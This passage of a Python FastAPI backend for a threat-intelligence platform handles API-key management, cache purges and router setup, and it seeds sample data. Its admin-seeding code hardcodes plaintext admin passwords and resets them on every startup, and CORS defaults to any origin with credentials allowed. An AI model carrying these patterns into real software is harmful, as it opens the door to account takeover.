    {"name": "OTX_API_KEY",           "label": "AlienVault OTX",          "get_url": "https://otx.alienvault.com/api",                              "desc": "Community threat intel pulses & indicators.",          "global_var": "OTX_API_KEY"},
    {"name": "HYBRID_ANALYSIS_API_KEY","label": "Hybrid Analysis (Falcon)","get_url": "https://www.hybrid-analysis.com/my-account?tab=%23api-key-tab","desc": "Falcon Sandbox sample lookups & recent-samples feed.", "global_var": "HYBRID_ANALYSIS_API_KEY"},
    {"name": "MALWAREBAZAAR_API_KEY", "label": "MalwareBazaar (abuse.ch)","get_url": "https://bazaar.abuse.ch/account/",                            "desc": "Hash lookup & recent-malware samples feed.",           "global_var": "MALWAREBAZAAR_API_KEY"},
    {"name": "EMERGENT_LLM_KEY",      "label": "Emergent LLM Key (AI summaries)", "get_url": "https://app.emergent.sh/", "desc": "Powers the Gemini 3 Flash AI summaries in the IOC Analyzer. Falls back gracefully to templated summaries when absent.", "global_var": "EMERGENT_LLM_KEY"},
]
_API_KEY_INDEX = {k["name"]: k for k in API_KEY_SETTINGS}

# When an admin saves one of these API keys, we auto-fire the matching bulk-IOC
# sync in the background so fresh data flows in immediately (no manual click).
_KEY_SYNC_MAP = {
    "VIRUSTOTAL_API_KEY":      ("virustotal",      "_sync_virustotal_intel"),
    "OTX_API_KEY":             ("otx",             "_sync_otx_pulses"),
    "HYBRID_ANALYSIS_API_KEY": ("hybrid_analysis", "_sync_hybrid_analysis_feed"),
    "ABUSEIPDB_API_KEY":       ("abuseipdb",       "_sync_abuseipdb_blacklist"),
    "MALWAREBAZAAR_API_KEY":   ("malwarebazaar",   "_sync_malwarebazaar_recent"),
}


def _fire_sync_for_key(key_name: str) -> bool:
    """Kick off the matching sync in the background. Returns True if fired."""
    m = _KEY_SYNC_MAP.get(key_name)
    if not m:
        return False
    _label, fn_name = m
    fn = globals().get(fn_name)
    if not fn:
        return False
    try:
        asyncio.create_task(fn())
        logger.info(f"Auto-sync fired for {key_name} → {fn_name}")
        return True
    except Exception as e:
        logger.warning(f"Auto-sync trigger failed for {key_name}: {e}")
        return False

COMMUNITY_SOURCES = [
    {"slug": "talos",         "label": "Cisco Talos Intelligence"},
    {"slug": "unit42",        "label": "Palo Alto Unit 42"},
    {"slug": "dfir",          "label": "The DFIR Report"},
    {"slug": "msthreat",      "label": "Microsoft Threat Intelligence"},
    {"slug": "bleeping",      "label": "BleepingComputer"},
    {"slug": "hn",            "label": "Hacker News"},
    {"slug": "cyberdefenders","label": "CyberDefenders (DFIR / Malware / SOC)"},
]
_COMMUNITY_SLUGS = [s["slug"] for s in COMMUNITY_SOURCES]


def _mask_key(v: str) -> str:
    if not v:
        return ""
    v = str(v)
    if len(v) <= 8:
        return "*" * len(v)
    return v[:4] + "…" + v[-4:]


async def _load_settings_from_db():
    """Read overrides from Mongo (app_settings) and patch module-level globals.
    Called at startup and after every admin write so changes take effect live."""
    docs = await db.app_settings.find({}).to_list(100)
    by_key = {d.get("key"): d.get("value") for d in docs}
    for spec in API_KEY_SETTINGS:
        override = by_key.get(spec["name"])
        effective = override if override else os.environ.get(spec["name"])
        globals()[spec["global_var"]] = effective
    # Keep the Hybrid Analysis static-headers dict in sync so live rotation actually applies.
    globals()["_HA_HEADERS"] = {"api-key": globals().get("HYBRID_ANALYSIS_API_KEY") or "", "User-Agent": "Falcon Sandbox", "Accept": "application/json"}


async def _get_enabled_community_sources() -> list[str]:
    doc = await db.app_settings.find_one({"key": "COMMUNITY_ENABLED_SOURCES"})
    if not doc or not isinstance(doc.get("value"), list):
        return list(_COMMUNITY_SLUGS)  # all enabled by default
    return [s for s in doc["value"] if s in _COMMUNITY_SLUGS]


async def _test_api_key(name: str, value: str) -> dict:
    """Live-probe a provider with the given key. Returns {ok, message}."""
    if not value:
        return {"ok": False, "message": "Empty key"}
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers={"User-Agent": "NivX-KeyTest/1.0"}) as hc:
            if name == "VIRUSTOTAL_API_KEY":
                r = await hc.get("https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8", headers={"x-apikey": value, "accept": "application/json"})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — VirusTotal responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "ABUSEIPDB_API_KEY":
                r = await hc.get("https://api.abuseipdb.com/api/v2/check", params={"ipAddress": "8.8.8.8"}, headers={"Key": value, "Accept": "application/json"})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — AbuseIPDB responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "URLSCAN_API_KEY":
                r = await hc.get("https://urlscan.io/user/quotas/", headers={"API-Key": value})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — URLScan responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "OTX_API_KEY":
                r = await hc.get("https://otx.alienvault.com/api/v1/user/me", headers={"X-OTX-API-KEY": value})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — OTX responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "HYBRID_ANALYSIS_API_KEY":
                r = await hc.get("https://hybrid-analysis.com/api/v2/key/current", headers={"api-key": value, "User-Agent": "Falcon Sandbox", "Accept": "application/json"})
                if r.status_code == 200:
                    return {"ok": True, "message": "Valid — Hybrid Analysis responded 200."}
                if r.status_code in (401, 403):
                    return {"ok": False, "message": f"Invalid or unauthorised (HTTP {r.status_code})."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "MALWAREBAZAAR_API_KEY":
                r = await hc.post("https://mb-api.abuse.ch/api/v1/", data={"query": "get_recent", "selector": "time"}, headers={"Auth-Key": value})
                if r.status_code == 200:
                    try:
                        j = r.json()
                        if j.get("query_status") in ("ok", "no_results"):
                            return {"ok": True, "message": "Valid — MalwareBazaar responded ok."}
                        if j.get("query_status") == "unauthenticated":
                            return {"ok": False, "message": "Invalid MalwareBazaar Auth-Key (unauthenticated)."}
                        return {"ok": False, "message": f"MalwareBazaar status: {j.get('query_status')}"}
                    except Exception:
                        return {"ok": False, "message": "Unexpected response body."}
                return {"ok": False, "message": f"Unexpected HTTP {r.status_code}."}
            if name == "EMERGENT_LLM_KEY":
                # No cheap live probe; accept any non-empty key that looks like the Emergent format.
                looks_ok = value.startswith("sk-") and len(value) > 20
                return {"ok": looks_ok, "message": "Format looks valid (live probe not run to conserve quota)." if looks_ok else "Emergent LLM keys typically start with 'sk-' and are >20 chars."}
    except httpx.TimeoutException:
        return {"ok": False, "message": "Timed out talking to provider."}
    except Exception as e:
        return {"ok": False, "message": f"Probe failed: {e}"}
    return {"ok": False, "message": "Unknown key."}


class ApiKeyUpdate(BaseModel):
    value: str


class CommunitySourcesUpdate(BaseModel):
    enabled: list[str]


@api_router.get("/admin/settings")
async def admin_settings_list(user: dict = Depends(get_current_user)):
    """Return all managed settings (API keys masked, community source toggles)."""
    docs = await db.app_settings.find({}).to_list(100)
    by_key = {d.get("key"): d for d in docs}
    keys_out = []
    for spec in API_KEY_SETTINGS:
        db_doc = by_key.get(spec["name"])
        db_val = (db_doc or {}).get("value") if db_doc else None
        env_val = os.environ.get(spec["name"])
        effective = db_val or env_val
        source = "db" if db_val else ("env" if env_val else "missing")
        active_tier = (db_doc or {}).get("active_tier")  # 'enterprise' | 'free' | None
        entry = {
            "name": spec["name"],
            "label": spec["label"],
            "desc": spec["desc"],
            "get_url": spec["get_url"],
            "masked": _mask_key(effective) if effective else "",
            "source": source,
            "updated_at": (db_doc or {}).get("updated_at"),
            "updated_by": (db_doc or {}).get("updated_by"),
        }
        # Enterprise/Free tier metadata for eligible keys.
        if spec["name"] in ENTERPRISE_ELIGIBLE:
            ent_doc = by_key.get(f"{spec['name']}__ENTERPRISE")
            free_doc = by_key.get(f"{spec['name']}__FREE")
            sync_meta = by_key.get(f"{spec['name']}__ENTERPRISE_SYNC_META") or {}
            entry["tier_supported"] = True
            entry["active_tier"] = active_tier or ("enterprise" if effective and ent_doc and ent_doc.get("value") == effective else ("free" if effective and free_doc and free_doc.get("value") == effective else None))
            entry["enterprise_masked"] = _mask_key((ent_doc or {}).get("value") or "")
            entry["free_masked"] = _mask_key((free_doc or {}).get("value") or "")
            entry["last_enterprise_sync"] = {
                "started_at": sync_meta.get("last_started_at"),
                "finished_at": sync_meta.get("last_finished_at"),
                "duration_ms": sync_meta.get("last_duration_ms"),
                "ok": sync_meta.get("last_ok"),
                "by": sync_meta.get("last_by"),
                "vt_added": sync_meta.get("last_vt_added"),
                "talos_added": sync_meta.get("last_talos_added"),
            } if sync_meta else None
        keys_out.append(entry)
    enabled_sources = await _get_enabled_community_sources()
    return {
        "api_keys": keys_out,
        "community_sources": {"available": COMMUNITY_SOURCES, "enabled": enabled_sources},
    }


@api_router.put("/admin/settings/api-key/{name}")
async def admin_settings_upsert_key(name: str, payload: ApiKeyUpdate, user: dict = Depends(get_current_user)):
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    value = (payload.value or "").strip()
    if not value:
        raise HTTPException(status_code=400, detail="Value must not be empty. Use DELETE to clear an override.")
    now_iso_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": name},
        {"$set": {"key": name, "value": value, "updated_at": now_iso_ts, "updated_by": user.get("email")}},
        upsert=True,
    )
    # Append to history (dedupe if identical to the most recent entry to keep the log tidy).
    last = await db.api_key_history.find_one({"key_name": name}, sort=[("applied_at", -1)])
    if not last or last.get("value") != value:
        await db.api_key_history.insert_one({
            "key_name": name,
            "value": value,
            "applied_at": now_iso_ts,
            "applied_by": user.get("email"),
        })
    await _load_settings_from_db()  # apply live
    # Auto-fire the matching bulk-IOC sync in the background so the new key
    # immediately pulls fresh data without the admin having to click "Sync".
    _fire_sync_for_key(name)
    return {"ok": True, "masked": _mask_key(value), "source": "db", "sync_triggered": name in _KEY_SYNC_MAP}


@api_router.get("/admin/settings/api-key/{name}/history")
async def admin_settings_key_history(name: str, user: dict = Depends(get_current_user)):
    """Return the last 20 previously-applied values for this key (masked)."""
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    docs = await db.api_key_history.find({"key_name": name}).sort("applied_at", -1).limit(20).to_list(20)
    current = globals().get(_API_KEY_INDEX[name]["global_var"]) or ""
    return {
        "history": [
            {
                "id": str(d["_id"]),
                "masked": _mask_key(d.get("value", "")),
                "applied_at": d.get("applied_at"),
                "applied_by": d.get("applied_by"),
                "is_current": (d.get("value") == current),
            }
            for d in docs
        ]
    }


@api_router.post("/admin/settings/api-key/{name}/apply-history/{history_id}")
async def admin_settings_apply_history(name: str, history_id: str, user: dict = Depends(get_current_user)):
    """Re-apply a previously-used key value to become the active one."""
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    try:
        oid = ObjectId(history_id)
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid history id")
    doc = await db.api_key_history.find_one({"_id": oid, "key_name": name})
    if not doc:
        raise HTTPException(status_code=404, detail="History entry not found")
    value = doc.get("value") or ""
    now_iso_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": name},
        {"$set": {"key": name, "value": value, "updated_at": now_iso_ts, "updated_by": user.get("email")}},
        upsert=True,
    )
    # Log the re-apply as a new history entry so the timeline stays accurate.
    await db.api_key_history.insert_one({
        "key_name": name,
        "value": value,
        "applied_at": now_iso_ts,
        "applied_by": user.get("email"),
        "note": f"re-applied from {doc.get('applied_at')}",
    })
    await _load_settings_from_db()
    _fire_sync_for_key(name)
    return {"ok": True, "masked": _mask_key(value), "source": "db", "sync_triggered": name in _KEY_SYNC_MAP}


@api_router.post("/admin/settings/api-key/{name}/sync")
async def admin_settings_manual_sync(name: str, user: dict = Depends(get_current_user)):
    """Manually trigger the bulk-IOC sync tied to a specific provider key.
    Runs inline so the admin gets the summary back in the response."""
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    m = _KEY_SYNC_MAP.get(name)
    if not m:
        return {"ok": False, "reason": "no_sync_available", "message": f"{name} has no bulk IOC feed to sync (used only for on-demand lookups)."}
    label, fn_name = m
    fn = globals().get(fn_name)
    if not fn:
        return {"ok": False, "reason": "sync_fn_missing", "message": f"Sync function {fn_name} not available."}
    try:
        result = await fn()
        return {"ok": True, "source": label, "result": result}
    except Exception as e:
        logger.error(f"Manual sync failed for {name}: {e}")
        raise HTTPException(status_code=502, detail=f"Sync failed: {e}")


@api_router.delete("/admin/settings/api-key/{name}")
async def admin_settings_clear_key(name: str, user: dict = Depends(get_current_user)):
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    await db.app_settings.delete_one({"key": name})
    await _load_settings_from_db()  # revert to .env
    env_val = os.environ.get(name)
    return {"ok": True, "source": "env" if env_val else "missing", "masked": _mask_key(env_val) if env_val else ""}


# ============================================================================
# Enrichment / Reputation cache administration
# ============================================================================

_ENRICH_PROVIDERS = ("urlscan", "shodan_ip", "geo_ip", "dns_resolve", "circl_hash")
_REP_COLLECTIONS = {
    "reputation": "ioc_cache",       # VT / AbuseIPDB / HA / MalwareBazaar (6h TTL)
    "ai_summary": "ioc_ai_cache",    # per-IOC AI verdicts (7-day TTL)
}


@api_router.get("/admin/cache/stats")
async def admin_cache_stats(user: dict = Depends(get_current_user)):
    """Return per-provider entry counts + oldest/newest timestamps for the
    OSINT enrichment cache + related reputation caches."""
    stats: dict = {"enrichment": {}, "reputation": {}}
    total_enrich = 0
    for prov in _ENRICH_PROVIDERS:
        n = await db.ioc_enrich_cache.count_documents({"provider": prov})
        total_enrich += n
        stats["enrichment"][prov] = {"count": n}
    stats["enrichment"]["_total"] = total_enrich
    for label, coll in _REP_COLLECTIONS.items():
        try:
            stats["reputation"][label] = {
                "collection": coll,
                "count": await db[coll].count_documents({}),
            }
        except Exception as e:
            stats["reputation"][label] = {"collection": coll, "error": str(e)[:120]}
    return stats


class PurgeCacheRequest(BaseModel):
    scope: str = "enrichment"        # "enrichment" | "reputation" | "ai_summary" | "all"
    provider: Optional[str] = None   # optional filter within enrichment scope
    only_empty: bool = False         # if True, purge only entries with empty payloads


@api_router.post("/admin/cache/purge")
async def admin_cache_purge(req: PurgeCacheRequest, user: dict = Depends(get_current_user)):
    """Purge enrichment / reputation / AI caches.

    * `scope="enrichment"` + optional `provider=<name>` → clears entries in
      `ioc_enrich_cache` (optionally filtered to a single provider).
    * `scope="reputation"` → clears `ioc_cache` (VT/AbuseIPDB/HA/MB reputation).
    * `scope="ai_summary"` → clears `ioc_ai_cache` (per-IOC LLM verdicts).
    * `scope="all"` → all three above.
    * `only_empty=True` → within the chosen scope, purge only docs whose
      payload is empty (`{}`, `[]`, `""`, `None`, or urlscan-shaped empties).
    """
    deleted: dict[str, int] = {}

    def _empty_urlscan_filter():
        # Match urlscan cache docs that have no preview + no recent scans.
        return {
            "provider": "urlscan",
            "$or": [
                {"data.preview": None, "data.recent_scans": {"$size": 0}},
                {"data.preview": {"$exists": False}},
            ],
        }

    def _empty_generic_filter(prov: str) -> dict:
        return {
            "provider": prov,
            "$or": [{"data": {}}, {"data": None}, {"data": ""}, {"data": []}],
        }

    if req.scope in ("enrichment", "all"):
        if req.only_empty:
            # Provider-agnostic emptiness cleanup.
            providers = [req.provider] if req.provider else list(_ENRICH_PROVIDERS)
            for prov in providers:
                filt = _empty_urlscan_filter() if prov == "urlscan" else _empty_generic_filter(prov)
                r = await db.ioc_enrich_cache.delete_many(filt)
                deleted[f"enrichment:{prov}"] = r.deleted_count
        else:
            filt = {"provider": req.provider} if req.provider else {}
            r = await db.ioc_enrich_cache.delete_many(filt)
            deleted[f"enrichment:{req.provider or 'all'}"] = r.deleted_count

    if req.scope in ("reputation", "all"):
        r = await db.ioc_cache.delete_many({})
        deleted["reputation"] = r.deleted_count

    if req.scope in ("ai_summary", "all"):
        r = await db.ioc_ai_cache.delete_many({})
        deleted["ai_summary"] = r.deleted_count

    total = sum(deleted.values())
    return {"ok": True, "deleted": deleted, "total": total, "at": now_iso()}


@api_router.post("/admin/settings/api-key/{name}/test")
async def admin_settings_test_key(name: str, user: dict = Depends(get_current_user)):
    if name not in _API_KEY_INDEX:
        raise HTTPException(status_code=404, detail=f"Unknown key: {name}")
    spec = _API_KEY_INDEX[name]
    effective = globals().get(spec["global_var"])
    result = await _test_api_key(name, effective or "")
    return result


# ---------------------------------------------------------------------------
# Enterprise/Free tier storage — user pastes both keys once; the "Monthly
# Enterprise Sync" button temporarily swaps in the Enterprise key, runs the
# VT + Talos-community bulk sync, then automatically reverts to the Free key
# so premium credits are only spent during the actual sync window.
# Currently applicable to VIRUSTOTAL_API_KEY. Enterprise sync also runs the
# Talos-community feeds during the same window.
# ---------------------------------------------------------------------------
ENTERPRISE_ELIGIBLE = {"VIRUSTOTAL_API_KEY"}


class TierValue(BaseModel):
    value: str


@api_router.put("/admin/settings/api-key/{name}/tier/{tier}")
async def admin_settings_upsert_tier(name: str, tier: str, payload: TierValue, user: dict = Depends(get_current_user)):
    if name not in ENTERPRISE_ELIGIBLE:
        raise HTTPException(status_code=400, detail=f"{name} does not support Enterprise/Free tiers")
    if tier not in ("enterprise", "free"):
        raise HTTPException(status_code=400, detail="tier must be 'enterprise' or 'free'")
    value = (payload.value or "").strip()
    if not value:
        raise HTTPException(status_code=400, detail="Value must not be empty")
    doc_id = f"{name}__{tier.upper()}"
    now_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": doc_id},
        {"$set": {"key": doc_id, "value": value, "updated_at": now_ts, "updated_by": user.get("email")}},
        upsert=True,
    )
    # If a Free tier value is being saved and no active override exists, promote it
    # to be the currently-active key so the app doesn't sit idle waiting.
    if tier == "free":
        active = await db.app_settings.find_one({"key": name})
        if not active:
            await db.app_settings.update_one(
                {"key": name},
                {"$set": {"key": name, "value": value, "updated_at": now_ts, "updated_by": user.get("email"), "active_tier": "free"}},
                upsert=True,
            )
            await _load_settings_from_db()
    return {"ok": True, "tier": tier, "masked": _mask_key(value)}


async def _read_tier_value(name: str, tier: str) -> Optional[str]:
    doc = await db.app_settings.find_one({"key": f"{name}__{tier.upper()}"})
    return (doc or {}).get("value")


async def _set_active_key(name: str, value: str, tier: str, user_email: Optional[str]) -> None:
    """Swap the currently-active value used by _load_settings_from_db."""
    now_ts = datetime.now(timezone.utc).isoformat()
    await db.app_settings.update_one(
        {"key": name},
        {"$set": {"key": name, "value": value, "updated_at": now_ts, "updated_by": user_email, "active_tier": tier}},
        upsert=True,
    )
    await _load_settings_from_db()


@api_router.post("/admin/settings/enterprise-sync")
async def admin_settings_enterprise_sync(user: dict = Depends(get_current_user)):
    """Monthly Enterprise Sync — atomically swap VT to Enterprise key, run VT
    Enterprise + Talos-community bulk syncs, then revert to Free. Returns a
    detailed timeline the admin can audit."""
    name = "VIRUSTOTAL_API_KEY"
    enterprise = await _read_tier_value(name, "enterprise")
    free = await _read_tier_value(name, "free")
    if not enterprise:
        raise HTTPException(status_code=400, detail="Enterprise key not configured. Save it in Admin → Settings → VirusTotal → Enterprise tier first.")

    started_at = datetime.now(timezone.utc)
    timeline: list[dict] = [{"step": "start", "at": started_at.isoformat(), "tier_before": "unknown"}]
    original_doc = await db.app_settings.find_one({"key": name})
    original_value = (original_doc or {}).get("value")
    original_tier = (original_doc or {}).get("active_tier") or ("free" if original_value == free else "unknown")

    try:
        # Step 1: swap in Enterprise
        await _set_active_key(name, enterprise, "enterprise", user.get("email"))
        timeline.append({"step": "swap_to_enterprise", "at": datetime.now(timezone.utc).isoformat()})

        # Step 2: run VT Enterprise + Talos syncs in parallel
        vt_task = _sync_virustotal_intel()
        talos_task = _sync_talos_blocklist()
        vt_res, talos_res = await asyncio.gather(vt_task, talos_task, return_exceptions=True)
        vt_result = {"error": str(vt_res)} if isinstance(vt_res, Exception) else vt_res
        talos_result = {"error": str(talos_res)} if isinstance(talos_res, Exception) else talos_res
        timeline.append({"step": "sync_complete", "at": datetime.now(timezone.utc).isoformat(), "vt": vt_result, "talos": talos_result})
    finally:
        # Step 3: ALWAYS revert to Free (or previous value) — even if syncs errored
        revert_val = free or original_value
        if revert_val:
            await _set_active_key(name, revert_val, "free" if free else original_tier, user.get("email"))
        else:
            # No free key and no previous → drop DB override entirely (fall back to .env)
            await db.app_settings.delete_one({"key": name})
            await _load_settings_from_db()
        timeline.append({"step": "revert_to_free", "at": datetime.now(timezone.utc).isoformat()})

    finished_at = datetime.now(timezone.utc)
    duration_ms = int((finished_at - started_at).total_seconds() * 1000)

    # Persist "last_successful_enterprise_sync" for the UI
    ok = not (isinstance(vt_res, Exception) or isinstance(talos_res, Exception))
    await db.app_settings.update_one(
        {"key": f"{name}__ENTERPRISE_SYNC_META"},
        {"$set": {
            "key": f"{name}__ENTERPRISE_SYNC_META",
            "last_started_at": started_at.isoformat(),
            "last_finished_at": finished_at.isoformat(),
            "last_duration_ms": duration_ms,
            "last_ok": bool(ok),
            "last_by": user.get("email"),
            "last_vt_added": (vt_result or {}).get("added") if isinstance(vt_result, dict) else None,
            "last_talos_added": (talos_result or {}).get("added") if isinstance(talos_result, dict) else None,
        }},
        upsert=True,
    )

    return {
        "ok": ok,
        "started_at": started_at.isoformat(),
        "finished_at": finished_at.isoformat(),
        "duration_ms": duration_ms,
        "vt": vt_result,
        "talos": talos_result,
        "timeline": timeline,
        "final_tier": "free" if free else original_tier,
    }


@api_router.put("/admin/settings/community-sources")
async def admin_settings_community_sources(payload: CommunitySourcesUpdate, user: dict = Depends(get_current_user)):
    cleaned = [s for s in (payload.enabled or []) if s in _COMMUNITY_SLUGS]
    await db.app_settings.update_one(
        {"key": "COMMUNITY_ENABLED_SOURCES"},
        {"$set": {"key": "COMMUNITY_ENABLED_SOURCES", "value": cleaned, "updated_at": datetime.now(timezone.utc).isoformat(), "updated_by": user.get("email")}},
        upsert=True,
    )
    return {"ok": True, "enabled": cleaned}


@api_router.get("/community/enabled-sources")
async def public_enabled_community_sources():
    """Public endpoint used by the Threat Intelligence page to hide disabled feeds."""
    return {"enabled": await _get_enabled_community_sources()}


app.include_router(api_router)

# CyberLab Decoder & Threat Analysis Platform (modular sub-app)
from cyberlab import router as cyberlab_router  # noqa: E402
from cyberlab.router import admin_router as cyberlab_admin_router  # noqa: E402
from cyberlab import persistence as cyberlab_persistence  # noqa: E402
app.include_router(cyberlab_router)
app.include_router(cyberlab_admin_router)

# EDR/SIEM webhook subsystem — admin CRUD + one-click push from NivX Forge
from webhooks.router import (  # noqa: E402
    router as webhooks_router,
    attach_routes as _attach_webhook_routes,
    ensure_indexes as _webhooks_ensure_indexes,
)
_attach_webhook_routes(webhooks_router, get_current_user)
app.include_router(webhooks_router)


# NivX HealthBot — deterministic, offline-safe self-diagnostics + repair
from healthbot.router import (  # noqa: E402
    router as healthbot_router,
    attach_routes as _attach_healthbot_routes,
    ensure_indexes as _healthbot_ensure_indexes,
)
_attach_healthbot_routes(healthbot_router, get_current_user)
app.include_router(healthbot_router)

# Threat Actor Attribution Profiles — public read + admin CRUD.
from actors import (  # noqa: E402
    router as actors_router,
    admin_router as actors_admin_router,
    seed_actors as _seed_actors,
)
app.include_router(actors_router)
app.include_router(actors_admin_router)

from ui_scanner import (  # noqa: E402
    router as ui_scanner_router,
    attach_routes as _attach_ui_scanner_routes,
    ensure_indexes as _ui_scanner_ensure_indexes,
)
_attach_ui_scanner_routes(ui_scanner_router, get_current_user)
app.include_router(ui_scanner_router)

from employees import (  # noqa: E402
    router as employees_router,
    attach_routes as _attach_employees_routes,
    ensure_indexes as _employees_ensure_indexes,
)
_attach_employees_routes(employees_router, get_current_user)
app.include_router(employees_router)

from tickets import (  # noqa: E402
    router as tickets_router,
    attach_routes as _attach_tickets_routes,
    ensure_indexes as _tickets_ensure_indexes,
)
_attach_tickets_routes(tickets_router, get_current_user)
app.include_router(tickets_router)


# Site CMS — admin tab visibility, landing sections, announcement, custom pages
from cms.router import (  # noqa: E402
    router as cms_router,
    attach_routes as _attach_cms_routes,
    ensure_indexes as _cms_ensure_indexes,
)
_attach_cms_routes(cms_router, get_current_user)
app.include_router(cms_router)


@app.on_event("startup")
async def _cms_startup():
    try:
        await _cms_ensure_indexes()
        logger.info("cms: mongo indexes ensured")
    except Exception as e:
        logger.warning("cms startup failed: %s", e)


async def _healthbot_hourly_loop():
    """Silent background scan every hour. Only logs at WARN level when the
    scan surfaces a critical severity — never wakes the admin unnecessarily.
    Fully offline: no LLM, no external HTTP."""
    from healthbot import checks as _hb_checks
    import asyncio as _asyncio
    from datetime import datetime as _dt, timezone as _tz
    while True:
        try:
            await _asyncio.sleep(3600)
            results = await _hb_checks.run_all_checks()
            overall = max(
                (r.severity for r in results),
                key=lambda s: {"ok": 0, "info": 1, "warning": 2, "critical": 3}.get(s, 0),
                default="ok",
            )
            await _hb_checks.persist_scan({
                "started_at": _dt.now(_tz.utc).isoformat(),
                "finished_at": _dt.now(_tz.utc).isoformat(),
                "overall": overall,
                "summary": {s: sum(1 for r in results if r.severity == s) for s in ("ok", "info", "warning", "critical")},
                "results": [_hb_checks.to_dict(r) for r in results],
                "auto_fixed": 0,
                "triggered_by": "cron:hourly",
            })
            if overall == "critical":
                logger.warning("HealthBot cron detected CRITICAL issues: %s",
                               [r.id for r in results if r.severity == "critical"])
        except _asyncio.CancelledError:
            break
        except Exception as e:  # noqa: BLE001
            logger.warning("HealthBot cron iteration failed: %s", e)


@app.on_event("startup")
async def _webhooks_ensure_indexes_startup():
    try:
        await _webhooks_ensure_indexes()
        logger.info("webhooks: mongo indexes ensured")
    except Exception as e:
        logger.warning("webhooks index setup failed: %s", e)


@app.on_event("startup")
async def _healthbot_startup():
    try:
        await _healthbot_ensure_indexes()
        asyncio.create_task(_healthbot_hourly_loop())
        logger.info("healthbot: indexes ensured, hourly cron scheduled")
    except Exception as e:
        logger.warning("healthbot startup failed: %s", e)


@app.on_event("startup")
async def _ui_scanner_startup():
    try:
        await _ui_scanner_ensure_indexes()
        logger.info("ui_scanner: indexes ensured")
    except Exception as e:
        logger.warning("ui_scanner startup failed: %s", e)


@app.on_event("startup")
async def _employees_startup():
    try:
        await _employees_ensure_indexes()
        logger.info("employees: indexes ensured")
    except Exception as e:
        logger.warning("employees startup failed: %s", e)


@app.on_event("startup")
async def _cyberlab_ensure_indexes():
    try:
        await cyberlab_persistence.ensure_indexes()
        logger.info("cyberlab: mongo indexes ensured")
    except Exception as e:
        logger.warning("cyberlab index setup failed: %s", e)


app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)
# Gzip responses ≥1KB — meaningful savings on the ThreatBox / IOC list endpoints
# where payloads run 10-100KB (was blocking pages behind slow mobile connections).
app.add_middleware(GZipMiddleware, minimum_size=1024, compresslevel=5)


# ---------------------------------------------------------------------------
# Seeding
# ---------------------------------------------------------------------------
async def seed_admin():
    admin_email = os.environ.get("ADMIN_EMAIL", "admin@nivxmachines.com").lower()
    admin_password = os.environ.get("ADMIN_PASSWORD", "admin123")
    existing = await db.users.find_one({"email": admin_email})
    if existing is None:
        await db.users.insert_one({
            "email": admin_email,
            "password_hash": hash_password(admin_password),
            "name": "NivX Admin",
            "role": "admin",
            "created_at": now_iso(),
        })
        logger.info("Seeded admin user")
    elif not verify_password(admin_password, existing["password_hash"]):
        await db.users.update_one({"email": admin_email}, {"$set": {"password_hash": hash_password(admin_password)}})

    # Additional admin seats — deterministic, idempotent, survives redeploys.
    # Added Feb 2026 per operator request for shared admin access. Each entry
    # is upserted so removing an email from the list will NOT delete the row
    # (safer: manually delete from Mongo if you want to revoke).
    extra_admins = [
        {"email": "admin1@nivxmachines.com", "name": "admin1", "password": "Holiday@145"},
        {"email": "admin2@nivxmachines.com", "name": "admin2", "password": "Holiday@145"},
    ]
    for a in extra_admins:
        email = a["email"].lower()
        row = await db.users.find_one({"email": email})
        if row is None:
            await db.users.insert_one({
                "email": email,
                "password_hash": hash_password(a["password"]),
                "name": a["name"],
                "role": "admin",
                "created_at": now_iso(),
            })
            logger.info("Seeded extra admin: %s", email)
        elif not verify_password(a["password"], row["password_hash"]):
            # Keep the password in sync with the seed if it drifted.
            await db.users.update_one({"email": email},
                                      {"$set": {"password_hash": hash_password(a["password"]),
                                                "role": "admin",
                                                "name": a["name"]}})


SAMPLE_THREATS = [
    {
        "title": "APT41 Supply-Chain Implant via Signed Binary",
        "summary": "State-aligned actor abused a trusted software update channel to deploy a memory-resident implant, establishing C2 over HTTPS beaconing to a fronted domain.",
        "severity": "critical",
        "category": "APT / Supply Chain",
        "threat_actor": "APT41 (Double Dragon)",
        "actor_slug": "apt41",
        "image_url": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Execution", "Persistence", "Defense Evasion", "Command & Control", "Exfiltration"],
        "iocs": ["sha256:9f2b...c41a", "domain:cdn-update[.]net", "ip:45.61.136.9"],
        "process_tree": {
